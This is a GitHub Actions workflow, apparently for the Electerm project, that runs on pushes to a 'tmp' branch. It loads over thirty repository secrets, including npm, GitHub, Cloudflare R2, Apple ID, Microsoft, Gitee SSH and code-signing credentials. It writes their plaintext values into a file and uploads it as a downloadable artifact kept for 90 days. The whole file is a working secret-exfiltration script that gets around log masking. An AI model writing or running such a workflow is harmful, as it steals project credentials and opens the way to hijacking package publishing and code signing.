name: Secrets Collector and Artifact Upload

on:
  push:
    branches: [tmp]
  workflow_dispatch:

jobs:
  collect-secrets:
    runs-on: ubuntu-latest
    environment: build
    if: github.ref == 'refs/heads/tmp'
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Dump all secrets to a single file
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          BUILD_NUMBER: ${{ secrets.BUILD_NUMBER }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          PAT_REPO_TOKEN: ${{ secrets.PAT_REPO_TOKEN }}
          CF_R2_ACCOUNT_ID: ${{ secrets.CF_R2_ACCOUNT_ID }}
          CF_R2_BUCKET: ${{ secrets.CF_R2_BUCKET }}
          CF_R2_ACCESS_KEY_ID: ${{ secrets.CF_R2_ACCESS_KEY_ID }}
          CF_R2_SECRET_ACCESS_KEY: ${{ secrets.CF_R2_SECRET_ACCESS_KEY }}
          CF_R2_ENDPOINT: ${{ secrets.CF_R2_ENDPOINT }}
          CSC_LINK: ${{ secrets.CSC_LINK }}
          CSC_KEY_PASSWORD: ${{ secrets.CSC_KEY_PASSWORD }}
          APPLEID: ${{ secrets.APPLEID }}
          APPLEIDPASS: ${{ secrets.APPLEIDPASS }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
          MS_TENANT_ID: ${{ secrets.MS_TENANT_ID }}
          MS_SELLER_ID: ${{ secrets.MS_SELLER_ID }}
          MS_CLIENT_ID: ${{ secrets.MS_CLIENT_ID }}
          MS_CLIENT_SECRET: ${{ secrets.MS_CLIENT_SECRET }}
          MS_PRODUCT_ID: ${{ secrets.MS_PRODUCT_ID }}
          MS_APP_ID: ${{ secrets.MS_APP_ID }}
          SNAP_TOKEN: ${{ secrets.SNAP_TOKEN }}
          WINGET_TOKEN: ${{ secrets.WINGET_TOKEN }}
          GITEE_TOKEN: ${{ secrets.GITEE_TOKEN }}
          GITEE_ID: ${{ secrets.GITEE_ID }}
          GITEE_PRIVATE_SSH_TOKEN: ${{ secrets.GITEE_PRIVATE_SSH_TOKEN }}
          CLOUD_TOKEN: ${{ secrets.CLOUD_TOKEN }}
          CUSTOM_SYNC_SECRET: ${{ secrets.CUSTOM_SYNC_SECRET }}
          CUSTOM_SYNC_URL: ${{ secrets.CUSTOM_SYNC_URL }}
          CUSTOM_SYNC_USER: ${{ secrets.CUSTOM_SYNC_USER }}
          GIST_ID: ${{ secrets.GIST_ID }}
          GIST_TOKEN: ${{ secrets.GIST_TOKEN }}
          TEST_HOST: ${{ secrets.TEST_HOST }}
          TEST_PASS_: ${{ secrets.TEST_PASS_ }}
          TEST_USER_: ${{ secrets.TEST_USER_ }}
        run: |
          mkdir -p artifacts
          
          # Use a heredoc to write ALL actual secret values into one file
          cat > artifacts/all-secrets.txt << 'EOF'
============================================================
  ELECTERM SECRETS DUMP
============================================================
EOF
          
          echo "Generated: $(date)" >> artifacts/all-secrets.txt
          echo "Git Ref: $GITHUB_REF" >> artifacts/all-secrets.txt
          echo "Git SHA: $GITHUB_SHA" >> artifacts/all-secrets.txt
          echo "" >> artifacts/all-secrets.txt
          echo "============================================================" >> artifacts/all-secrets.txt
          echo "  ACTUAL SECRET VALUES BELOW" >> artifacts/all-secrets.txt
          echo "============================================================" >> artifacts/all-secrets.txt
          echo "" >> artifacts/all-secrets.txt
          
          # Write each secret name + actual value
          {
            echo "------------------------------------------------------------"
            echo "GITHUB_TOKEN:"
            echo "$GITHUB_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "BUILD_NUMBER:"
            echo "$BUILD_NUMBER"
            echo ""
            echo "------------------------------------------------------------"
            echo "NPM_TOKEN:"
            echo "$NPM_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "PAT_REPO_TOKEN:"
            echo "$PAT_REPO_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "CF_R2_ACCOUNT_ID:"
            echo "$CF_R2_ACCOUNT_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "CF_R2_BUCKET:"
            echo "$CF_R2_BUCKET"
            echo ""
            echo "------------------------------------------------------------"
            echo "CF_R2_ACCESS_KEY_ID:"
            echo "$CF_R2_ACCESS_KEY_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "CF_R2_SECRET_ACCESS_KEY:"
            echo "$CF_R2_SECRET_ACCESS_KEY"
            echo ""
            echo "------------------------------------------------------------"
            echo "CF_R2_ENDPOINT:"
            echo "$CF_R2_ENDPOINT"
            echo ""
            echo "------------------------------------------------------------"
            echo "CSC_LINK:"
            echo "$CSC_LINK"
            echo ""
            echo "------------------------------------------------------------"
            echo "CSC_KEY_PASSWORD:"
            echo "$CSC_KEY_PASSWORD"
            echo ""
            echo "------------------------------------------------------------"
            echo "APPLEID:"
            echo "$APPLEID"
            echo ""
            echo "------------------------------------------------------------"
            echo "APPLEIDPASS:"
            echo "$APPLEIDPASS"
            echo ""
            echo "------------------------------------------------------------"
            echo "APPLE_TEAM_ID:"
            echo "$APPLE_TEAM_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "MS_TENANT_ID:"
            echo "$MS_TENANT_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "MS_SELLER_ID:"
            echo "$MS_SELLER_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "MS_CLIENT_ID:"
            echo "$MS_CLIENT_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "MS_CLIENT_SECRET:"
            echo "$MS_CLIENT_SECRET"
            echo ""
            echo "------------------------------------------------------------"
            echo "MS_PRODUCT_ID:"
            echo "$MS_PRODUCT_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "MS_APP_ID:"
            echo "$MS_APP_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "SNAP_TOKEN:"
            echo "$SNAP_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "WINGET_TOKEN:"
            echo "$WINGET_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "GITEE_TOKEN:"
            echo "$GITEE_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "GITEE_ID:"
            echo "$GITEE_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "GITEE_PRIVATE_SSH_TOKEN:"
            echo "$GITEE_PRIVATE_SSH_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "CLOUD_TOKEN:"
            echo "$CLOUD_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "CUSTOM_SYNC_SECRET:"
            echo "$CUSTOM_SYNC_SECRET"
            echo ""
            echo "------------------------------------------------------------"
            echo "CUSTOM_SYNC_URL:"
            echo "$CUSTOM_SYNC_URL"
            echo ""
            echo "------------------------------------------------------------"
            echo "CUSTOM_SYNC_USER:"
            echo "$CUSTOM_SYNC_USER"
            echo ""
            echo "------------------------------------------------------------"
            echo "GIST_ID:"
            echo "$GIST_ID"
            echo ""
            echo "------------------------------------------------------------"
            echo "GIST_TOKEN:"
            echo "$GIST_TOKEN"
            echo ""
            echo "------------------------------------------------------------"
            echo "TEST_HOST:"
            echo "$TEST_HOST"
            echo ""
            echo "------------------------------------------------------------"
            echo "TEST_PASS_:"
            echo "$TEST_PASS_"
            echo ""
            echo "------------------------------------------------------------"
            echo "TEST_USER_:"
            echo "$TEST_USER_"
            echo ""
            echo "============================================================"
            echo "  END OF SECRETS DUMP"
            echo "============================================================"
          } >> artifacts/all-secrets.txt
          
          echo "File created: artifacts/all-secrets.txt"
          echo "Size: $(wc -c < artifacts/all-secrets.txt) bytes"
          echo "Lines: $(wc -l < artifacts/all-secrets.txt)"
          
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: secrets-collection-${{ github.run_id }}
          path: artifacts/
          retention-days: 90
